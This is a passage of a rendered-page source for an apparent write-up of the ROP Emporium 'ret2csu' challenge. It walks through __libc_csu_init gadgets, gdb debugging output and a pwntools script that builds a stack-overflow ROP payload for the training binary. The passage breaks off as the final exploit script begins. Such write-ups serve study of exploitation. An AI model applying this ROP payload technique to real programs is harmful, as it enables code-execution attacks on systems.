operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"From the above code, we are now able to control the \",(0,e.jsx)(a.strong,{children:\"rdx, rsi and edi\"}),\" registers.The call in the second stage gadgets, calculates the destination address of our code.\"]}),(0,e.jsxs)(a.p,{children:[\"Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to \",(0,e.jsx)(a.strong,{children:\"ret2win\"}),\" challenge.\"]}),(0,e.jsx)(a.blockquote,{children:(0,e.jsx)(a.p,{children:'This challenge is very similar to \"callme\", with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the \"callme\" challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM \u0026 MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.'})}),(0,e.jsx)(a.p,{children:\"From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\"  #first args   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\"  #second args  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\"  #third args   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),`\n`]})]})}),(0,e.jsx)(a.p,{children:\"From the code snip above, we are now able to control the values of ropchain by setting the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb. Debugging our exploit ensures that there is no unexpected behavior in the code to avoid crashing of the program.\"}),(0,e.jsx)(a.p,{children:\"For debugging purposes, we set a breakpoint in our first address of the ropchain gadget, and run our program with the generated payload.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) break \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040069a\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Breakpoint \",(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),\" at \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069a\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) r \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"tmp\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),`payload\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Starting program: \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"home\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"vx\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"Downloads\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"rop\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"rop\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"ret2csu\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"ret2csu \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"tmp\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),`payload\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Breakpoint \",(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),\", \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040069a\"}),` in __libc_csu_init ()\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) c\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`Continuing.\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`ret2csu by ROP Emporium\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`x86_64\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Check out https:\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"ropemporium.com\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"challenge\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),`ret2csu.html for information on how to solve this challenge.\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\" Thank you\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"Breakpoint \",(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),\", \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040069a\"}),` in __libc_csu_init ()\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsxs)(a.p,{children:[\"When the program is run,its hits the breakpoint. We enter \",(0,e.jsx)(a.strong,{children:\"c\"}),\" command for continue, to continue the execution of our program. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of the breakpoint, the execution stops. Now we can inspect the memory addresses in order to understand the behavior of the program and the values loaded in the registers loaded in our first chain.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) x\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"/\"}),\"10i \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"$\"}),`rip\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069a\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"90\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"91\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069c\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"92\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40069e\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"94\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"96\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a2\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"98\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a4\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"100\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret    \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a5\"}),`:\tnop\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006a6\"}),\":\tnop    WORD PTR \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"cs\"}),\":\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4006b0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_fini\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\trepz ret \n`]})]})}),(0,e.jsxs)(a.p,{children:[\"Now we can Single step through our assembly code and view the value stored in the register values of our gadget. The command for single stepping in gdb is \",(0,e.jsx)(a.strong,{children:\"si\"}),\".\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"(gdb) i r \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4343434343434343\"}),\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"4846791580151137091\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4242424242424242\"}),\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4242424242424242\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4141414141414141\"}),\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"4702111234474983745\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),\"  \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"2401053088876216593\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),\"  \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"3819410105351357762\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),\"            \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),\"  \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"3454841397007486963\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsx)(a.p,{children:\"From the analysis, we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`import pwn\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pop_gadget \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0040069a\"}),`)\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"b\",(0,e.jsx)(a.span,{className:\"token string\",children:'\"A\"'}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"32\"}),` #fill the buffer\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"b\",(0,e.jsx)(a.span,{className:\"token string\",children:'\"B\"'}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),\" #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`(saved)\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),` pop_gadget  #retaddr\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4343434343434343\"}),\")#\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4242424242424242\"}),\")#\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x4141414141414141\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn.p64(\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),\") #\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"open(\",(0,e.jsx)(a.span,{className:\"token string\",children:\"'payload'\"}),\", \",(0,e.jsx)(a.span,{className:\"token string\",children:\"'wb'\"}),`).write(payload)\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"Now, because we are able to control the registers we want, we need to determine the correct or desired values for \",(0,e.jsx)(a.strong,{children:\"rbx, rbp and r12\"}),\" registers because 0x41..., 0x42...., 0x43... are not valid memory addresses. Because after execution of our second rop gadget, we need to set right values of rbp and rbx due to a loop conditional.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400680\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400683\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"67\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400686\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"70\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400689\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"73\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040068d\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"77\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x1\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400691\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"81\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcmp    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400694\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"84\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tjne    \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x400680\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400696\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"86\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x8\"}),`\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"The address of second gadget starts at \",(0,e.jsx)(a.strong,{children:\"0x0000000000400680\"}),\",in which we are setting the values of rdi,r14 and rdx with correct argument values. we need to set the values of \",(0,e.jsx)(a.strong,{children:\"rbx\"}),\" and \",(0,e.jsx)(a.strong,{children:\"rbp\"}),\" correctly so that conditional \",(0,e.jsx)(a.strong,{children:\"cmp\"}),\" is always true. Because of add instruction of 1 to rbx, we need to set the rbx value to 0 and rbp value to 1. when the comparison is being done, the values are equal and Zero flag is set. Adjust values in payload script and single step to confirm the validity of new values in the memory.\"]}),(0,e.jsxs)(a.p,{children:[\"For register \",(0,e.jsx)(a.strong,{children:\"r12\"}),\", we set the value to a memory region that is executable. In the binary, the \",(0,e.jsx)(a.strong,{children:\".bss\"}),\" section is executable. we now set the r12 register with the memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.\"]}),(0,e.jsxs)(a.p,{children:[\"Lastly we need to control the \",(0,e.jsx)(a.strong,{children:\"rdi\"}),\" register with the value \",(0,e.jsx)(a.strong,{children:\"0xdeadbeefdeadbeef\"}),\". Because we have full control of rdx and rsi register, we need to look for \",(0,e.jsx)(a.strong,{children:\"pop rdi, ret\"}),\" gadget.\"]}),(0,e.jsx)(a.p,{children:\"The pop rdi, ret gadget\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x004006a3\"}),\"                 5f  pop \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x004006a4\"}),`                 c3  ret\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"Now we can pass the \",(0,e.jsx)(a.strong,{children:\"0xdeadbeefdeadbeef\"}),\" argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.\"]}),(0,e.jsxs)(a.h2,{id:\"exploit\",children:[(0,e.jsx)(a.a,{href:\"#exploit\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"Exploit\"]}),(0,e.jsx)(a.p,{children:\"The full code of the rop is as shown below.\"}),(0,e.jsx)(a.pre,{className:\"language-python\",children:(0,e.jsxs)(a.code,{className:\"code-highlight language-python\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token keyword\",children:\"import\"}),` pwn\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(a.span,{className:\"token 